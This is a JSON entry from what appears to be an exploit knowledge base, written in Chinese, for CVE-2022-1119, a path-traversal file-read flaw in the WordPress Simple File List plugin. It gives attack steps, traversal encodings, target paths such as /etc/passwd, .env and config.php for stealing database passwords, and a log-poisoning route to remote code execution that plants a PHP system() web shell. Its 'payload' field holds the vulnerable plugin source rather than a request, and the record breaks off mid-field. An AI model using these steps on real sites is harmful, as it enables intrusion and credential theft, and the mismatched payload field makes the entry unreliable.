{"id": "awesome-poc:cve-2022-1119", "kind": "poc", "title": "WordPress Simple File List ee-downloader.php 任意文件读取漏洞 CVE-2022-1119", "technique": "path-traversal", "summary": "CMS漏洞 / CVE-2022-1119。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2022-1119 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["CMS漏洞", "CVE-2022-1119"], "payload_template": "<?php // Simple File List - ee-downloader.php - rev 1.19 - mitchellbennis@gmail.com\n\n// Force File to Download\n// This script is accessed via javascript on ee-download.php \n\n$eeFile =  filter_var($_GET['eeFile'], FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW);\n\nif(is_readable($eeFile)) {\n\n    header('Pragma: public'); // required\n    header('Expires: 0'); // no cache\n    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');\n    header('Last-Modified: '. gmdate ('D, d M Y H:i:s', filemtime ($eeFile)) .' GMT');\n    header('Cache-Control: private',false);\n    header('Content-Type: ' . mime_content_type($eeFile) );\n    header('Content-Disposition: attachment; filename=\"'. basename($eeFile) .'\"');\n    // header('Content-Transfer-Encoding: binary');\n    header('Content-Length: '. filesize($eeFile)); // provide file size\n    header('Connection: close');\n    readfile($eeFile); // Start the download\n\n}\n?>", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2022-1119 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认读得通：`/etc/passwd` 能出内容再往下，否则换编码（`..%2f`、`..%252f`、`....//`）。", "直接冲 flag 的常见位置：`/flag`、`/flag.txt`、`/tmp/flag`、`/root/flag`、`/home/*/flag`，以及应用目录下的 `config.php`/`.env`（里面有 DB 口令，可转 SQLi 或登录后台）。", "读不到就用日志投毒转 RCE：把 `<?php system($_GET[c]);?>` 写进 `access.log`，再 `?file=/var/log/apache2/access.log&c=id`。"], "provenance": {"source_type": "reference-corpus", "source_ref": 